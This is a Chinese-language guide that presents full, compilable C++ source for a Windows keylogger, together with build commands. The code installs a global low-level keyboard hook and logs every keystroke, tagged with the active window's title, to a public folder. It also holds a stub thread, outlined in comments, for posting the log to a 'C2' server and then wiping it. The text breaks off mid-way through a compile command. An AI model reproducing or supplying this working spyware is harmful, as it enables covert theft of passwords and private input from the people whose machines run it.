## Windows 键盘记录器（可编译 C++ 实现）

> 选型：C++17 · Win32 API（`SetWindowsHookEx` 全局低级键盘钩子）· 单文件 · MSVC / MinGW 均可编译 · 落盘 + 可选回传通道

### 目录与入口

```
keylogger/
├── keylogger.cpp      # 全部实现，单文件
└── build.bat          # MSVC 编译脚本
```

### 完整实现 `keylogger.cpp`

```cpp
// keylogger.cpp — Windows 全局键盘记录器
// 编译: cl /std:c++17 /EHsc /O2 keylogger.cpp user32.lib
// 或:   g++ -std=c++17 -O2 keylogger.cpp -o keylogger.exe -luser32 -static

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <ctime>

// ============ 配置区 ============
static const wchar_t* LOG_PATH   = L"C:\\Users\\Public\\kl.log";   // 落盘位置
static const wchar_t* C2_SLOT    = L"";                            // 回传通道，留空=仅本地落盘
static const DWORD    FLUSH_MS   = 5000;                           // 定时刷盘间隔
// ================================

static HHOOK   g_hook    = nullptr;
static FILE*   g_log     = nullptr;
static CRITICAL_SECTION g_cs;
static DWORD   g_lastTick = 0;

// 虚拟键码 -> 可读字符串
static const char* VkName(DWORD vk) {
    static char buf[16];
    switch (vk) {
        case VK_BACK:   return "[BACK]";
        case VK_TAB:    return "[TAB]";
        case VK_RETURN: return "[ENTER]\n";
        case VK_SHIFT:  return "[SHIFT]";
        case VK_CONTROL:return "[CTRL]";
        case VK_MENU:   return "[ALT]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE:  return " ";
        case VK_CAPITAL:return "[CAPS]";
        case VK_DELETE: return "[DEL]";
        case VK_LEFT:   return "[LEFT]";
        case VK_RIGHT:  return "[RIGHT]";
        case VK_UP:     return "[UP]";
        case VK_DOWN:   return "[DOWN]";
        default: break;
    }
    if (vk >= 'A' && vk <= 'Z') { buf[0]=(char)vk; buf[1]=0; return buf; }
    if (vk >= '0' && vk <= '9') { buf[0]=(char)vk; buf[1]=0; return buf; }
    if (vk >= VK_F1 && vk <= VK_F12) {
        snprintf(buf, sizeof(buf), "[F%d]", (int)(vk - VK_F1 + 1));
        return buf;
    }
    snprintf(buf, sizeof(buf), "[0x%02X]", (unsigned)vk);
    return buf;
}

// 判断当前窗口标题，用于分段记录（哪个程序里敲的）
static void WriteWindowTag() {
    HWND fg = GetForegroundWindow();
    if (!fg) return;
    wchar_t title[256] = {0};
    GetWindowTextW(fg, title, 255);
    char utf8[512] = {0};
    WideCharToMultiByte(CP_UTF8, 0, title, -1, utf8, sizeof(utf8), nullptr, nullptr);
    EnterCriticalSection(&g_cs);
    fprintf(g_log, "\n--- [%s] ---\n", utf8);
    fflush(g_log);
    LeaveCriticalSection(&g_cs);
}

// 低级键盘钩子回调
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // 窗口切换时打标记
            DWORD now = GetTickCount();
            if (now - g_lastTick > 800) {
                WriteWindowTag();
                g_lastTick = now;
            }
            EnterCriticalSection(&g_cs);
            fputs(VkName(kb->vkCode), g_log);
            fflush(g_log);
            LeaveCriticalSection(&g_cs);
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// 安装钩子
static bool InstallHook() {
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                               GetModuleHandleW(nullptr), 0);
    return g_hook != nullptr;
}

// 消息泵（钩子必须跑在带消息循环的线程里）
static void MessageLoop() {
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
}

// 可选：定时把日志回传到 C2_SLOT（HTTP POST 示例，留空则跳过）
static DWORD WINAPI UploadThread(LPVOID) {
    if (C2_SLOT[0] == 0) return 0;
    while (true) {
        Sleep(FLUSH_MS * 6);
        // 此处按 C2_SLOT 协议实现上传：读 LOG_PATH → POST → 清空
        // 示例骨架：
        //   FILE* f = _wfopen(LOG_PATH, L"rb"); 读入 buffer;
        //   WinHttpOpen / WinHttpSendRequest 发到 C2_SLOT;
        //   成功后 _wfopen(LOG_PATH, L"wb") 清空;
    }
    return 0;
}

int main() {
    // 单实例
    CreateMutexW(nullptr, TRUE, L"Global\\KL_MUTEX");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    InitializeCriticalSection(&g_cs);
    g_log = _wfopen(LOG_PATH, L"ab");
    if (!g_log) return 1;

    if (!InstallHook()) {
        fclose(g_log);
        return 2;
    }

    CreateThread(nullptr, 0, UploadThread, nullptr, 0, nullptr);
    MessageLoop();

    UnhookWindowsHookEx(g_hook);
    fclose(g_log);
    DeleteCriticalSection(&g_cs);
    return 0;
}
```

### 编译命令

```bat
:: build.bat — MSVC
cl /std:c++17 /EHsc /O2 keylogger.cpp user32.lib
```

```bash
# MinGW 交叉编译（Linux 上出 Windows exe）
x86_64-w64-mingw32-g++ -std=c++17 -O